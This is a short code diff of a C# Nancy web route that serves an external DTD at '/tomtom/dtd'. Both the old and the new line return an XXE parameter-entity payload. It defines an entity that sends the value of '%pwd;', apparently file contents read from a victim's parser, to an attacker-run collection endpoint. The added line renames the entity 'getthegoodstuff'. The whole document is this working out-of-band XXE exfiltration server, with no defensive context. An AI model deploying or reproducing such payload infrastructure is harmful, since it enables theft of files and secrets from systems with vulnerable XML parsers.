@@ -49,7 +49,7 @@ namespace DuosWeb
 
             Get["/tomtom/dtd"] = _ =>
             {
-                return Response.AsText("<!ENTITY % param1 \"<!ENTITY &#37; send SYSTEM 'http://duos.apphb.com/tomtom/add?q=%pwd;'>\"> % param1; ").WithContentType("application/xml");
+                return Response.AsText("<!ENTITY %getthegoodstuff \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?q=%pwd;';\"> %getthegoodstuff;").WithContentType("application/xml");
             };
         }
 
